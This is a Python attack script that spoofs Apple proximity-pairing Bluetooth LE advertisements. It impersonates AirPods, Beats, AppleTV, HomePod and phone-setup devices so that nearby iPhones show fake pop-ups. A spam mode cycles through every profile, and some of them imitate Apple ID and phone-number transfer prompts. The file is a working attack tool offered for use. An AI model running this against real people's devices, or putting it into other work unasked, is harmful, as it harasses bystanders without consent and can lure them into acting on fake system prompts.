# Author: ECTO-1A & SAY-10
# Github: https://github.com/ECTO-1A
# Updated: reso7200 @ https://github.com/reso7200
# Based on the previous work of chipik / _hexway

import argparse
import bluetooth._bluetooth as bluez
from globals import devices, jumpToAnotherDevice
from time import sleep
from utils.bluetooth_utils import toggle_device, start_le_advertising, stop_le_advertising

# Add a docstring to describe the purpose of the script
help_desc = '''

Apple Proximity Pairing Notification Spoofing

---ECTO-1A August 2023---

Based on the previous work of chipik / _hexway

'''

# Define different bt_data options and their corresponding descriptions
bt_data_options = {
    0: "All/Spam",
    1: "Airpods",
    2: "Airpods Pro",
    3: "Airpods Max",
    4: "Airpods Gen 2",
    5: "Airpods Gen 3",
    6: "Airpods Pro Gen 2",
    7: "PowerBeats",
    8: "PowerBeats Pro",
    9: "Beats Solo Pro",
    10: "Beats Studio Buds",
    11: "Beats Flex",
    12: "BeatsX",
    13: "Beats Solo3",
    14: "Beats Studio3",
    15: "Beats Studio Pro",
    16: "Beats Fit Pro",
    17: "Beats Studio Buds+",
    18: "AppleTV Setup",
    19: "AppleTV Pair",
    20: "AppleTV New User",
    21: "AppleTV AppleID Setup",
    22: "AppleTV Wireless Audio Sync",
    23: "AppleTV Homekit Setup",
    24: "AppleTV Keyboard",
    25: "AppleTV 'Connecting to Network'",
    26: "Homepod Setup",
    27: "Setup New Phone",
    28: "Transfer Number to New Phone",
    29: "TV Color Balance"

    # Add more options as needed
}


def main():
    parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-i', '--interval', default=200, type=int, help='Advertising interval (default 200))')
    parser.add_argument('-d', '--data', type=int, help='Select a message to send (e.g., -d 1)')
    args = parser.parse_args()

    if args.data is None:
        print("Please select a message option using -d.")
        print("Available message options:")
        for option, description in bt_data_options.items():
            print(f"{option}: {description}")
        return

    if args.data not in bt_data_options:
        print(f"Invalid data option: {args.data}")
        print("Available data options:")
        for option, description in bt_data_options.items():
            print(f"{option}: {description}")
        return

    # the default Bluetooth device is hci0
    dev_id = 0
    toggle_device(dev_id, True)

    # Define the bt_data based on the selected option
    selected_option = args.data
    bt_data = None

    if selected_option == 0:
        spam = True
    else:
        spam = False

    if selected_option == 1:
        bt_data = devices.Airpods
    elif selected_option == 2:
        bt_data = devices.Airpods_Pro
    elif selected_option == 3:
        bt_data = devices.Airpods_Max
    elif selected_option == 4:
        bt_data = devices.Airpods_gen2
    elif selected_option == 5:
        bt_data = devices.Airpods_gen3
    elif selected_option == 6:
        bt_data = devices.Airpods_Pro_gen2
    elif selected_option == 7:
        bt_data = devices.PowerBeats
    elif selected_option == 8:
        bt_data = devices.PowerBeats_Pro
    elif selected_option == 9:
        bt_data = devices.Beats_Solo_Pro
    elif selected_option == 10:
        bt_data = devices.Beats_Studio_Buds
    elif selected_option == 11:
        bt_data = devices.Beats_Flex
    elif selected_option == 12:
        bt_data = devices.BeatsX
    elif selected_option == 13:
        bt_data = devices.Beats_Solo3
    elif selected_option == 14:
        bt_data = devices.Beats_Studio3
    elif selected_option == 15:
        bt_data = devices.Beats_Studio_Pro
    elif selected_option == 16:
        bt_data = devices.Beats_Fit_Pro
    elif selected_option == 17:
        bt_data = devices.Beats_Studio_Buds_plus
    elif selected_option == 18:
        bt_data = devices.AppleTV_Setup
    elif selected_option == 19:
        bt_data = devices.AppleTV_Pair
    elif selected_option == 20:
        bt_data = devices.AppleTV_New_User
    elif selected_option == 21:
        bt_data = devices.AppleTV_AppleID_Setup
    elif selected_option == 22:
        bt_data = devices.AppleTV_Wireless_Audio_Sync
    elif selected_option == 23:
        bt_data = devices.AppleTV_Homekit_Setup
    elif selected_option == 24:
        bt_data = devices.AppleTV_Keyboard
    elif selected_option == 25:
        bt_data = devices.AppleTV_Connecting_to_Network
    elif selected_option == 26:
        bt_data = devices.Homepod_Setup
    elif selected_option == 27:
        bt_data = devices.Setup_New_Phone
    elif selected_option == 28:
        bt_data = devices.Transfer_Number_to_New_Phone
    elif selected_option == 29:
        bt_data = devices.TV_Color_Balance
    # Add more options as needed

    if bt_data is None and (selected_option != 0):
        print("Invalid data option: {args.data}")
        return

    try:
        sock = bluez.hci_open_dev(dev_id)
    except Exception as e:
        print(f"Unable to connect to Bluetooth hardware {dev_id}: {e}")
        return

    if selected_option != 0:
        print("Advertising Started... Press Ctrl+C to Stop")

    if not spam:

        try:
            start_le_advertising(sock, adv_type=0x03, min_interval=args.interval, max_interval=args.interval,
                                 data=bt_data)
            while True:
                sleep(2)
        except KeyboardInterrupt:
            stop_le_advertising(sock)
        except Exception as e:
            print(f"An error occurred: {e}")
            stop_le_advertising(sock)

    else:
        # Spam option
        bt_data_options_spam = {
            'Airpods': devices.Airpods,
            'Airpods_Pro': devices.Airpods_Pro,
            'Airpods_Max': devices.Airpods_Max,
            'Airpods_gen2': devices.Airpods_gen2,
            'Airpods_gen3': devices.Airpods_gen3,
            'Airpods_Pro_gen2': devices.Airpods_Pro_gen2,
            'PowerBeats': devices.PowerBeats,
            'PowerBeats_Pro': devices.PowerBeats_Pro,
            'Beats_Solo_Pro': devices.Beats_Solo_Pro,
            'Beats_Studio_Buds': devices.Beats_Studio_Buds,
            'Beats_Flex': devices.Beats_Flex,
            'BeatsX': devices.BeatsX,
            'Beats_Solo3': devices.Beats_Solo3,
            'Beats_Studio3': devices.Beats_Studio3,
            'Beats_Studio_Pro': devices.Beats_Studio_Pro,
            'Beats_Fit_Pro': devices.Beats_Fit_Pro,
            'Beats_Studio_Buds_plus': devices.Beats_Studio_Buds_plus,
            'AppleTV_Setup': devices.AppleTV_Setup,
            'AppleTV_Pair': devices.AppleTV_Pair,
            'AppleTV_New_User': devices.AppleTV_New_User,
            'AppleTV_AppleID_Setup': devices.AppleTV_AppleID_Setup,
            'AppleTV_Wireless_Audio_Sync': devices.AppleTV_Wireless_Audio_Sync,
            'AppleTV_Homekit_Setup': devices.AppleTV_Homekit_Setup,
            'AppleTV_Keyboard': devices.AppleTV_Keyboard,
            'AppleTV_Connecting_to_Network': devices.AppleTV_Connecting_to_Network,
            'Homepod_Setup': devices.Homepod_Setup,
            'Setup_New_Phone': devices.Setup_New_Phone,
            'Transfer_Number_to_New_Phone': devices.Transfer_Number_to_New_Phone,
            'TV_Color_Balance': devices.TV_Color_Balance,
        }

        # Create a Bluetooth socket
        # Select to switch between devices Automaticly or Manually
        def select_spam_option():

            spam_option = input("1. Auto\n2. Manual\nSelect option: ")

            if spam_option != "1" and spam_option != "2":
                return select_spam_option()
            else:
                return spam_option

        spam_option = select_spam_option()
        if spam_option == "1":
            # Auto switch devices
            # Start LE advertising for each device
            for device_name, bt_data in bt_data_options_spam.items():
                print("Advertising Started... Press Ctrl+C to Stop")
                print(f"Advertising with device: {device_name}")
                try:
                    start_le_advertising(sock, adv_type=0x03, min_interval=args.interval, max_interval=args.interval,
                                         data=bt_data)
                    while True:
                        # Sleep for 8 seconds
                        sleep(8)
                        raise jumpToAnotherDevice
                except KeyboardInterrupt:
                    stop_le_advertising(sock)
                except jumpToAnotherDevice:
                    pass
                except Exception as e:
                    print(f"An error occurred: {e}")
                    stop_le_advertising(sock)

        else:
            # Manual switch devices
            # Start LE advertising for each device
            for device_name, bt_data in bt_data_options_spam.items():
                print(f"Advertising with device: {device_name}")
                try:
                    start_le_advertising(sock, adv_type=0x03, min_interval=args.interval, max_interval=args.interval,
                                         data=bt_data)
                    print(f"Press Ctrl + C to Advertise next device")
                    while True:
                        sleep(2)
                except KeyboardInterrupt:
                    stop_le_advertising(sock)
                except Exception as e:
                    print(f"An error occurred: {e}")
                    stop_le_advertising(sock)


if __name__ == "__main__":
    main()
